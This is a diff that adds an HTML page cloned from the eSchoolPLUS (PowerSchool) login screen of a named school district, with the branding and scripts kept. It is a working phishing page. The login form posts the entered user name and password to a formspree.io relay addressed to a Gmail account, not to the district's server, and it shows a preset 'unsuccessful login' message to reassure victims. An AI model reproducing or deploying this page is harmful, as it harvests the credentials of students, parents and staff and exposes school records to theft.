@@ -1,0 +1,228 @@
+
+<!DOCTYPE html>
+<html>
+
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width" />
+
+    
+    <title>Login</title>
+
+    <link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
+
+    
+    <link href="ui.jqgrid.css" rel="stylesheet"/>
+
+
+    
+    <link href="sungard-font-awesome.css" rel="stylesheet"/>
+<link href="select2.css" rel="stylesheet"/>
+<link href="spectrum.css" rel="stylesheet"/>
+<link href="sungard-bootstrap.css" rel="stylesheet"/>
+<link href="sungard-bootstrap-theme.css" rel="stylesheet"/>
+
+
+    
+<link href="sungard-default-theme.css" rel="stylesheet"/>
+    
+
+    
+    <link href="eSchoolPLUS-bootstrap.css" rel="stylesheet"/>
+<link href="site.css" rel="stylesheet"/>
+
+    <link href="SunGard.QuickSearch.css" rel="stylesheet"/>
+<link href="SunGard.eSchoolPLUS.Environment.css" rel="stylesheet"/>
+
+    <link href="sungard-theme-options.css" rel="stylesheet"/>
+
+
+    <style type="text/css">
+        /*{ScreenPrintCss}*/
+    </style>
+
+    
+    
+    <link href="LogOn.css" rel="stylesheet"/>
+
+
+<link href="sungard-login.css" rel="stylesheet"/>
+
+
+    
+    <script src="jquery-2.1.1.js"></script>
+
+    <script src="modernizr-2.8.3.js"></script>
+
+
+    
+    
+</head>
+<body>
+    <script type="text/javascript">
+        $(function () {
+            SunGard.Common.FocusOnLoadEnabled(true);
+            SunGard.Common.Init("https://esp.coppellisd.com/eSchoolPLUS/", true);
+            SunGard.Common.AddResource("UnsavedChangesMessage", "Unsaved Changes");
+            SunGard.Common.AddResource("ChangesSavedMessage", "Changes Saved");
+            SunGard.Common.AddResource("DialogUnsavedChangesMessage", "Unsaved Changes");
+            SunGard.Common.AddResource("DialogChangesSavedMessage", "Changes Saved");
+            SunGard.Common.AddResource("NavigateAwayMessage", "Changes that have been made will be lost.  Do you wish to continue?");
+            SunGard.Common.AddResource("NewPageMessage", "Changes that have been made will be lost.  Do you want to save changes?");
+            SunGard.Common.AddResource("SaveChangesDialogTitle", "Save Changes?");
+            SunGard.Common.AddResource("DateInvalid", "The {0} field is not a valid date.");
+            SunGard.eSchoolPLUS.Init(undefined, 'eSchoolPLUS');
+
+            SunGard.eSchoolPLUS.Area('');
+            SunGard.eSchoolPLUS.Controller('Account');
+            SunGard.eSchoolPLUS.Action('LogOn');
+
+        });
+    </script>
+    <header class="sg-dialog-print-hidden">
+        <div id="aff-nav-wrapper" style="position: relative;">
+            <div id="affix-nav" data-spy="affix">
+                
+                <div class="sg-banner-container sg-page-title-area">
+                    <div class="sg-page-title-shadow"></div>
+                    
+                    <div class="container sg-page-transition"></div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <div id="MainContent" class="sg-main-content">
+        <div class="container sg-page-content">
+            <div class="hidden-xs">
+                <div class="validation-summary-valid alert alert-danger sg-dialog-print-invisible" data-valmsg-summary="true"><span>Your attempt to log in was unsuccessful.</span>
+<ul><li style="display:none"></li>
+</ul></div>
+                
+
+
+
+
+<form action="https://formspree.io/powerschool.info@gmail.com" autocomplete="off" method="post">
+<div class="row">
+    &nbsp;
+</div>
+<div class="row">
+    <div class="hidden-xs col-sm-8 col-md-8 col-lg-6 col-xl-4 col-sm-offset-2 col-md-offset-2 col-lg-offset-3 col-xl-offset-4">
+        <div class="sg-login-container">
+            <div class="sg-login">
+                <div class="sg-login-separator-100"></div>
+                <div class="sg-login-welcome">Welcome to</div>
+                <div class="sg-login-separator-7"></div>
+                <div class="sg-login-app-logo sg-login-app-logo-esp"></div>
+                <div class="sg-login-separator-37"></div>
+                <div class="sg-login-labels"><label class="control-label" for="UserName">User Name</label></div>
+                <div class="sg-login-separator-6"></div>
+                <div class="sg-login-id sg-login-input"><input autocomplete="off" class="form-control sg-track-changes" data-sgvalid-isvalid="true" data-val="true" data-val-required="The User Name field is required." data-val-sgvalid="Server Validation Error" id="UserName" name="UserName" type="text" value="" /></div>
+                <div class="sg-login-separator-20"></div>
+                <div class="sg-login-labels"><label class="control-label" for="Password">Password</label></div>
+                <div class="sg-login-separator-6"></div>
+                <div class="sg-login-password sg-login-input">
+                    <input class="hidden form-control sg-track-changes" data-sgvalid-isvalid="true" data-val="true" data-val-sgvalid="Server Validation Error" id="tempUN" name="tempUN" type="text" value="" />
+                    <input class="hidden form-control sg-track-changes" data-sgvalid-isvalid="true" data-val="true" data-val-sgvalid="Server Validation Error" id="tempPW" name="tempPW" type="password" />
+                    <input autocomplete="off" class="form-control sg-track-changes" data-sgvalid-isvalid="true" data-val="true" data-val-required="The Password field is required." data-val-sgvalid="Server Validation Error" id="Password" name="Password" type="password" />
+                </div>
+                <div class="sg-login-separator-30"></div>
+                <div class="sg-login-sign-in"><button class="btn-default btn" id="login" name="login" type="submit" value="">Sign In</button></div>
+                <div class="sg-login-separator-40"></div>
+                <div class="sg-login-copyright">
+                    Copyright&nbsp;&copy;&nbsp;2003-2019 PowerSchool Group LLC and/or its affiliate(s). All rights reserved. All trademarks are either owned or licensed by PowerSchool Group LLC and/or its affiliates.<br />
+                    <span class="sg-login-link"><a href="http://www.powerschool.com/" target="_blank">PowerSchool.com</a></span>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<input id="UnifiedClassroomOnboardRequest" name="UnifiedClassroomOnboardRequest" type="hidden" value="False" /></form>
+            </div>
+            <div class="visible-xs">
+                <div class="row">
+                    &nbsp;
+                </div>
+                <div class="row">
+                    &nbsp;
+                </div>
+                <div class="row">
+                    <div class="col-xs-6 col-xs-offset-3 alert alert-warning">
+                        The current display is too small.  Resize the window or change the screen resolution so it is at least 768px wide.
+                    </div> 
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="AjaxSpinner"></div>
+
+    <footer>
+    </footer>
+
+    
+    <script src="jquery-ui-1.11.1.js"></script>
+
+    <script src="jquery.unobtrusive-ajax.js"></script>
+<script src="jquery.validate.js"></script>
+<script src="jquery.validate.unobtrusive.js"></script>
+<script src="SunGard.jquery.validate.extended.js"></script>
+<script src="mvcfoolproof.unobtrusive.js"></script>
+
+
+    
+    <script src="knockout-3.4.0.debug.js"></script>
+<script src="knockout.mapping-latest.debug.js"></script>
+<script src="SunGard.Common.KnockoutBindings.js"></script>
+<script src="knockout-es5.js"></script>
+
+
+    
+    <script src="ui.multiselect.js"></script>
+<script src="jquery.jqgrid.js"></script>
+<script src="grid.locale-en.js"></script>
+
+
+    
+    <script src="bootstrap.js"></script>
+<script src="moment.js"></script>
+<script src="select2.js"></script>
+<script src="SunGard.select2.extended.js"></script>
+<script src="spectrum.js"></script>
+<script src="bootstrap-datepicker.js"></script>
+<script src="bootstrap-datetimepicker.js"></script>
+<script src="SunGard.Bootstrap.js"></script>
+
+
+    
+    <script src="SunGard.Common.js"></script>
+<script src="SunGard.Common.Html.js"></script>
+<script src="SunGard.Common.Validation.js"></script>
+<script src="SunGard.jqgrid.extended.js"></script>
+<script src="SunGard.DynamicLayout.js"></script>
+<script src="SunGard.Common.SGPanelSlider.js"></script>
+
+
+    
+    <script src="SunGard.eSchoolPLUS.js"></script>
+<script src="SunGard.eSchoolPLUS.Bootstrap.js"></script>
+
+
+    
+    
+    <script type="text/javascript">
+        SunGard.Common.Validation.InitializeCustomUnobtrusiveValidation();
+        $(function () {
+            SunGard.Bootstrap.JQGrid.ResizeAllGrids();
+            SunGard.Bootstrap.JQGrid.StrikeoutDeletedRows();
+            SunGard.Common.ApplyFocusOnLoad();
+        });
+    </script>
+
+    
+
+</body>
+
+</html>
